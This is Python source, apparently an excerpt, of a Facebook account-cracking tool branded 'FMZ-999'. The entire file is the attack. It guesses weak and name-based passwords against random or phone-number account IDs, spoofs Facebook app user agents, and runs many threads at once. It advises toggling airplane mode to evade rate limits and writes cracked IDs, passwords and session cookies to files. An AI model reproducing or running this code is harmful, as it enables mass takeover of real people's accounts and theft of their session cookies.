...
def randomck():
	...
	uas = 'Davik/2.1.0 (Linux; U; Android '+str(random.randrange(5,12))+'.0.1; '+str(fbdv)+' Build/'+str(build)+') '+END
	return uas
...
def asif4():
	...
	fban = random.choice(["FB4A", "FB5A", "FB6A"])
	fbpn = random.choice(["com.facebook.katana", "com.facebook.orca","messenger-android", "com.facebook.lite"])
	model = random.choice(["ASUS_Z016D","ASUS_AI2401_H","ASUS_Z017DA","ASUS_X01AD","ASUS X Pad 10 LTE","ASUS_AI2302"])
	bal = '[FBAN/'+fban+';FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/'+fblc+';FBRV/45904160;FBCR/'+fbcr+';FBMF/asus;FBBD/asus;FBPN/'+fbpn+';FBDV/'+model+';FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]'
	return bal
def lol():
	...
	lol = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/286.0.0.48.112;FBBV/242171849;FBDM/{density=2.75,width=1080,height=2131};FBLC/en_GB;FBRV/0;FBCR/VIVO;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/'+model+';FBSV/10;FBOP/1;FBCA/arm64-v8a:;]'
	return lol
totaldmp = 0
count = 0
loop = 0
...
os.system('xdg-open https://t.me/axncyberking')
logo =f"""
	 █████      ██   ██     ███    ██ 
	██   ██      ██ ██      ████   ██ 
	███████       ███       ██ ██  ██ 
	██   ██      ██ ██      ██  ██ ██ 
	██   ██     ██   ██     ██   ████\x1b[1;92m[\x1b[1;97mV 6.1\x1b[1;92m

\033[1;32m──────────────────────────────────────────────────
\033[1;32m[\033[1;31m✓\033[1;32m] AUTHOR    : ASIF
\033[1;32m[\033[1;31m✓\033[1;32m] GITHUB    : Asif950
\033[1;32m[\033[1;31m✓\033[1;32m] STATUS    : \033[1;36mACTIVE
\033[1;32m[\033[1;31m✓\033[1;32m] TOOL TYPE : \033[1;33mFILE / RANDOM
\033[1;32m[\033[1;31m✓\033[1;32m] VERSION   : \033[1;34m6.1 \033[1;34mFREE
\033[1;32m──────────────────────────────────────────────────"""
...
def menu():   
    ...
    #print(f'\033[1;32m[\033[1;31m3\033[1;32m] OWNER FACEBOOK ID')
...
def _old_():
       ...
       if ask in["1"]:
        ...
        star="100000"
        for i in range(int(limit)):
            data=str(random.choice(range(10000000,999999999)))
            user.append(data)
    
       with Asif(max_workers=40) as ASIF:
           clear()
...
def yek():
    ...
    umah = '[FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444756;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_GB;FBRV/279865282;FBCR/Robi;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G930F;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]'
    xuna = sex+umah
...
def login(uid):
    ...
    try:
        sys.stdout.write(f"\r\033[1;32m[\033[1;31mFMZ-999XD\033[1;32m] \033[1;35m{loop}\033[1;35m \033[1;32m|\033[1;32m OK{G}/{R}CP \033[1;32m|\033[1;32m {G}{len(ok)}/{R}{len(cp)} ")
        sys.stdout.flush()
        for pw in ["123456","1234567","12345678","123456789","123123","112233","1234567890"]:
            ...
            if "session_key" in rp:
                print(f"\r{R}[{R}FMZ-999CP{R}]{R} {uid} | {pw}")
                open("/sdcard/ASIF.txt","a").write(uid+"|"+pw+"\n")
                cps.append(uid)
                break 
            elif "www.facebook.com" in rp["error_msg"]:          
            	print(f"\r{R}[{G1}FMZ-999OK{R}]{G1} {uid} | {pw}")
            	open("/sdcard/FMZ-999cp.txt","a").write(uid+"|"+pw+"\n")
            	oks.append(uid)
            	break
            elif "Please Confirm Email" in str(rp):            
            	print(f"\r{R}[{G1}FMZ-999OK{R}]{G1} {uid} | {pw}")
            	open("/sdcard/FMZ-999ok.txt","a").write(uid+"|"+pw+"\n")
            	oks.append(uid)
            	break
            else:continue
        loop+=1
...
def _bd_():
    ...
    for x in range(limit):
        ...
        user.append(nmp)
    clear()
    with Asif(max_workers=30) as sexy:
        clear()
        ...
        for love in user:
            ...
            psd = [code+name+cod+love,cod+love,name+love,code+name+cod,'i love you','Bangladesh']
...
def _India_():
    ...
    with Asif(max_workers=30) as sexy:
        ...
        for love in user:
            ids = code+love
            psd = [love,ids[:8],'57273200','59039200','57575751','974987','974920','loveindia','india123','506070','708090','102030','405060','khan123','Krishna']
            sexy.submit(randm,ids,psd)
    print('')
    print(f'\r{G}──────────────────────────────────────────────────')
    print(f'\033[1;32m[\033[1;31m✓\033[1;32m] THE PROCESS HAS BEEN COMPLETED')
...
def _Afg_():
    clear()
    print(f'\033[1;32m[\033[1;31m✓\033[1;32m] EXAMPLE {G}:{G1} +9330{G}/{G1}+9340{G}/{G1}+9350{G}/{G1}+9378 ');linex()
    code = input(f'\033[1;32m[\033[1;31m✓\033[1;32m] CHOICE  {G}:{G2} ')
    clear()
    print(f'\033[1;32m[\033[1;31m✓\033[1;32m] EXAMPLE {G}:{G3} 3000{G}/{G3}5000{G}/{G3}10000{G}/{G3}99999');linex()
    limit = int(input(f'\033[1;32m[\033[1;31m✓\033[1;32m] CHOICE  {G}:{G4} '))
...
def _file_():
    ...
    print(f'\033[1;32m[\033[1;31m2\033[1;32m] METHOD {G1}[{G}M2{G1}]{G1} ')
    print(f'\033[1;32m[\033[1;31m3\033[1;32m] METHOD {G1}[{G}M3{G1}]{G1} ')
    #print(f'\033[1;32m[\033[1;31m3\033[1;32m] METHOD {G1}[{G}M4{G1}]{G1} ')
   # print(f'\033[1;32m[\033[1;31m2\033[1;32m] METHOD {G1}[{G}M5{G1}]{G1} ')
    linex()
...
class main_crack():
    ...
    def crack(self,id):
        global methods
        clear()
        print(f'\033[1;32m[\033[1;31m✓\033[1;32m] EXAMPLE {G}:{G1} /sdcard/ASIF.txt');linex()
    ...
    def pasw(self):       
            ...
            print(f'\033[1;32m[\033[1;31m✓\033[1;32m] TODAY DATE {G}:{G2} {date}')
            print(f'\033[1;32m[\033[1;31m✓\033[1;32m] TURN {G3}[{O}ON{G}/{S}OFF{G3}]{G3} AIRPLANE MODE EVERY {R}5{G3} MIN')
            linex()
                       ...
                       if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 8:
                           pwx =  pw
                            ...
                            if 'methodA' in methods:
                                ASIFworld.submit(self.methodA,uid,name,pwx)
                            elif 'methodB' in methods:
                                ASIFworld.submit(self.methodB,uid,name, pwx)
                            elif 'methodC' in methods:
                                ASIFworld.submit(self.methodC,uid,name, pwx)
                            elif 'methodD' in methods:
                                ASIFworld.submit(self.methodD,uid,name, pwx)
                            elif 'methodE' in methods:
                                ASIFworld.submit(self.methodE,uid,name, pwx)
                            elif 'methodF' in methods:
                                ASIFworld.submit(self.methodF,uid,name, pwx)
                            elif 'methodG' in methods:
                                ASIFworld.submit(self.methodG,uid,name, pwx)
                   except:pass
            result(oks,cps)          
#__________________[ FILE METHOD M1 ]__________________#             
    def methodA(self,sid,name,psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r\033[1;93m[\033[0;95mFMZ-999M1\033[1;37m] \033[1;33m{loop}\033[1;33m \033[1;34m|\033[1;32m OK\033[1;32m | \033[1;31mCP \033[1;32m[{len(oks)}]\033[1;34m [\033[1;31m {len(cps)}\033[1;34m] \033[1;36m{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            android_version = f"Android {random.randint(4, 10)}.{random.randint(0, 9)}.{random.randint(0, 9)}"
            facebook_version = f'{random.randint(10,432)}.0.0.{random.randint(11,99)}.{random.randint(1,200)}'
            fbbv = str(random.randint(10000000, 99999999))
            ...
            model = random.choice(["2201116SI", "M2012K11AI", "22011119TI", "21091116UI", "M2102K1AC", "M2012K11I", "22041219I", "22041216I", "2203121C", "2106118C", "2201123G", "2203129G", "2201122G", "2201122C", "2206122SC", "22081212C", "2112123AG", "2112123AC", "2109119BC", "M2002J9G", "M2007J1SC", "M2007J17I", "M2102J2SC", "M2007J3SY", "M2007J17G", "M2007J3SG", "M2011K2G", "M2101K9AG ", "M2101K9R", "2109119DG", "M2101K9G", "2109119DI", "M2012K11G", "M2102K1G", "21081111RG", "2107113SG", "21051182G", "M2105K81AC", "M2105K81C", "21061119DG", "21121119SG", "22011119UY", "21061119AG", "21061119AL", "22041219NY", "22041219G", "21061119BI", "220233L2G", "220233L2I", "220333QNY", "220333QAG", "M2004J7AC", "M2004J7BC", "M2004J19C", "M2006C3MII", "M2010J19SI", "M2006C3LG", "M2006C3LVG", "M2006C3MG", "M2006C3MT", "M2006C3MNG", "M2006C3LII", "M2010J19SL", "M2010J19SG", "M2010J19SY", "M2012K11AC", "M2012K10C", "M2012K11C", "22021211RC"])
            uaio = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/'+facebook_version+';FBBV/'+fbbv+';FBDM/{density=2.0,width=720,height=1369};FBLC/'+fblc+';FBRV/'+fbrv+';FBCR/'+fbcr+';FBMF/Xiaomi;FBBD/Xiaomi;FBPN/'+fbpn+';FBDV/'+model+';FBSV/10;FBOP/1;FBCA/arm64-v8a:;]'
            ua = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/'+facebook_version+';FBBV/'+fbbv+';FBDM/{density=3.0,width=1080,height=1920};FBLC/uk_UA;FBRV/213212609;FBCR/'+fbcr+';FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/'+model+';FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
            uaaaaaaaa= '[FBAN/FB4A;FBAV/482.0.0.51.80;FBBV/455415830;FBDM/{density=1.9125,width=720,height=1400};FBLC/en_GB;FBRV/272210345;FBCR/Boost Mobile;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/moto g fast;FBSV/10;FBBK/1;FBOP/1;FBCA/arm64-v8a:;]'
...
#__________________[ FILE METHOD M2 ]__________________#             
    def methodB(self,sid,name,psw):
        try:
            ...
            sys.stdout.write(f"\r\033[1;32m[\033[1;31mFMZ-999M2\033[1;32m] \033[1;36m{loop}\033[1;35m \033[1;34m|\033[1;32m OK\033[1;34m|\033[1;31mCP \033[1;32m{len(oks)}\033[1;34m|\033[1;31m{len(cps)} \033[1;34m| \033[1;36m{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            android_version = f"Android {random.randint(4, 10)}.{random.randint(0, 9)}.{random.randint(0, 9)}"
            facebook_version = f'{random.randint(10,432)}.0.0.{random.randint(11,99)}.{random.randint(1,200)}'
            fbbv = str(random.randint(10000000, 99999999))
            ...
            redmi = random.choice(["2201116SI", "M2012K11AI", "22011119TI", "21091116UI", "M2102K1AC", "M2012K11I", "22041219I", "22041216I", "2203121C", "2106118C", "2201123G", "2203129G", "2201122G", "2201122C", "2206122SC", "22081212C", "2112123AG", "2112123AC", "2109119BC", "M2002J9G", "M2007J1SC", "M2007J17I", "M2102J2SC", "M2007J3SY", "M2007J17G", "M2007J3SG", "M2011K2G", "M2101K9AG ", "M2101K9R", "2109119DG", "M2101K9G", "2109119DI", "M2012K11G", "M2102K1G", "21081111RG", "2107113SG", "21051182G", "M2105K81AC", "M2105K81C", "21061119DG", "21121119SG", "22011119UY", "21061119AG", "21061119AL", "22041219NY", "22041219G", "21061119BI", "220233L2G", "220233L2I", "220333QNY", "220333QAG", "M2004J7AC", "M2004J7BC", "M2004J19C", "M2006C3MII", "M2010J19SI", "M2006C3LG", "M2006C3LVG", "M2006C3MG", "M2006C3MT", "M2006C3MNG", "M2006C3LII", "M2010J19SL", "M2010J19SG", "M2010J19SY", "M2012K11AC", "M2012K10C", "M2012K11C", "22021211RC"])
            #######m2####
            asif = '[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957647;FBDM/{density=2.0,width=720,height=1406};FBLC/ru_RU;FBRV/334763932;FBCR/MTS RUS;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/vivo 1906;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]'
            samsung = random.choice(['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550   5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R',
  		  'GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X',
			'GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230',
			'GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','GT-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838',
			'GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L',
			'GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750'])
            uua = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/294.0.0.39.118;FBBV/253340706;FBDM/{density=3.5,width=1440,height=2730};FBLC/en_US;FBRV/253980635;FBCR/'+fbcr+';FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/'+samsung+';FBSV/10;FBOP/1;FBCA/arm64-v8a:;]'
            u = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/{facebook_version};FBBV/{fbbv};FBDM/{density=1.5,width=480,height=800};FBLC/{fbcl};FBCR/{fbcr};FBMF/samsung;FBBD/samsung;FBPN/{fbpn};FBDV/{samsung};FBSV/4.4.4;nullFBCA/armeabi-v7a:armeabi;]'
            model = random.choice(["2201116SI", "M2012K11AI", "22011119TI", "21091116UI", "M2102K1AC", "M2012K11I", "22041219I", "22041216I", "2203121C", "2106118C", "2201123G", "2203129G", "2201122G", "2201122C", "2206122SC", "22081212C", "2112123AG", "2112123AC", "2109119BC", "M2002J9G", "M2007J1SC", "M2007J17I", "M2102J2SC", "M2007J3SY", "M2007J17G", "M2007J3SG", "M2011K2G", "M2101K9AG ", "M2101K9R", "2109119DG", "M2101K9G", "2109119DI", "M2012K11G", "M2102K1G", "21081111RG", "2107113SG", "21051182G", "M2105K81AC", "M2105K81C", "21061119DG", "21121119SG", "22011119UY", "21061119AG", "21061119AL", "22041219NY", "22041219G", "21061119BI", "220233L2G", "220233L2I", "220333QNY", "220333QAG", "M2004J7AC", "M2004J7BC", "M2004J19C", "M2006C3MII", "M2010J19SI", "M2006C3LG", "M2006C3LVG", "M2006C3MG", "M2006C3MT", "M2006C3MNG", "M2006C3LII", "M2010J19SL", "M2010J19SG", "M2010J19SY", "M2012K11AC", "M2012K10C", "M2012K11C", "22021211RC"])
            uka = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/386.0.0.35.108;FBBV/317217654;FBDM/{density=2.0,width=720,height=1369};FBLC/'+fblc+';FBRV/325030047;FBCR/'+fbcr+';FBMF/Xiaomi;FBBD/Xiaomi;FBPN/'+fbpn+';FBDV/'+model+';FBSV/10;FBOP/1;FBCA/arm64-v8a:;]'
            uao = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/'+facebook_version+';FBBV/'+fbbv+';FBDM/{density=3.0,width=1080,height=1920};FBLC/en_GB;FBRV/213212609;FBCR/Vodafone UA;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/'+model+';FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
            motrol= (["XT2125","XT2125-4"])
            kk = "Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-G930F Build/R16NW) [FBAN/FB4A;FBAV/187.0.0.43.81;FBPN/com.facebook.katana;FBLC/fr_FR;FBBV/122388438;FBCR/Bouygues Telecom;FBMF/samsung;FBBD/samsung;FBDV/"+samsung+";FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,h"
            lol = "FBAN/FB4A;FBAV/304.0.0.39.118;FBBV/271127351;FBDM/{density=1.9125,width=720,height=1400};FBLC/en_GB;FBRV/272210345;FBCR/Boost Mobile;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/'+motorol+';FBSV/10;FBBK/1;FBOP/1;FBCA/arm64-v8a:;]" 
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
            except:
            ...
            for pw in psw:
                ...
                if 'session_key' in q:
                    ...
                    print(f"\r\r{G1}[FMZ-999OK] {sid} | {ps} ")
                #    print(f"\r\r{G1}[COOKIES-💛]>{B}{cookie} ")
                    open('/sdcard/FMZ-999M2-FILE-OK.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    oks.append(sid)
                    break
                elif 'www.facebook.com' in q['error']['message']:
                   # print(f"\r\r{M}[FMZ-999CP] {sid} | {ps} ")
 ...
 #__________________[ FILE METHOD M3 ]__________________#             
    ...
    def methodC(self,sid,name,psw):
        try:
            ...
            redmi = random.choice(["2201116SI", "M2012K11AI", "22011119TI", "21091116UI", "M2102K1AC", "M2012K11I", "22041219I", "22041216I", "2203121C", "2106118C", "2201123G", "2203129G", "2201122G", "2201122C", "2206122SC", "22081212C", "2112123AG", "2112123AC", "2109119BC", "M2002J9G", "M2007J1SC", "M2007J17I", "M2102J2SC", "M2007J3SY", "M2007J17G", "M2007J3SG", "M2011K2G", "M2101K9AG ", "M2101K9R", "2109119DG", "M2101K9G", "2109119DI", "M2012K11G", "M2102K1G", "21081111RG", "2107113SG", "21051182G", "M2105K81AC", "M2105K81C", "21061119DG", "21121119SG", "22011119UY", "21061119AG", "21061119AL", "22041219NY", "22041219G", "21061119BI", "220233L2G", "220233L2I", "220333QNY", "220333QAG", "M2004J7AC", "M2004J7BC", "M2004J19C", "M2006C3MII", "M2010J19SI", "M2006C3LG", "M2006C3LVG", "M2006C3MG", "M2006C3MT", "M2006C3MNG", "M2006C3LII", "M2010J19SL", "M2010J19SG", "M2010J19SY", "M2012K11AC", "M2012K10C", "M2012K11C", "22021211RC"])
            #######m3##
            lokl = "FBAN/FB4A;FBAV/304.0.0.39.118;FBBV/271127351;FBDM/{density=1.9125,width=720,height=1400};FBLC/en_GB;FBRV/272210345;FBCR/Boost Mobile;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/'+motorol+';FBSV/10;FBBK/1;FBOP/1;FBCA/arm64-v8a:;]" 
            kolki = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/"+facebook_version+";FBBV/"+fbbv+";FBDM/{density=2.75,width=1080,height=2131};FBLC/"+fblc+";FBRV/"+fbrv+";FBCR/VIVO;FBMF/Xiaomi;FBBD/xiaomi;FBPN/"+fbpn+";FBDV/"+radmi+";FBSV/"+fbsv+";FBOP/1;FBCA/arm64-v8a:;]'
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
            except:
...
def randm(ids,psd):
    ...
    uam = '[FBAN/FB4A;FBAV/'+str(random.randint(111,999))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/'+str(random.randint(40,100))+'.0.0.'+str(random.randint(1,66))+'.119;FBBV/'+str(random.randint(111111111,666666666))+';FBDM/{density=2.0,width=720,height=1440};FBLC/en_GB;FBRV/'+str(random.randint(111111111,666666666))+';FBCR/Nepal Telecom;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/'+str(redmi)+';FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
    user_agent="[FBAN/FB4A;FBAV/279.0.0.43.120;FBBV/231021068;FBDM/{density=3.0,width=1080,height=2076};FBLC/en_GB;FBRV/0;FBCR/T-Mobile;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G950U;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]"
    sys.stdout.write(f"\r\033[1;32m[\033[1;31mFMZ-999RNDM\033[1;32m] \033[1;35m{loop}\033[1;35m \033[1;32m|\033[1;32m OK{G}/{R}CP \033[1;32m|\033[1;32m {G}{len(ok)}/{R}{len(cp)} ")
    sys.stdout.flush()
    try:
        for pas in psd:
            data={
            ...
            if 'access_token' in q:
                uid = str(q['uid'])
                ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ASIFb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ASIFb};{ckkk}"
                print(f'\r\r{R1}[FMZ-999OK] {uid} | {pas}')
                print(f'\r\r{G1}[COOKIE]{R} {cookie}')
                open('/sdcard/FMZ-999RNDM-OK.txt','a').write(uid+'|'+pas+'|'+cookie+'\n')
                ok.append(uid)
                break
                continue
        loop+=1
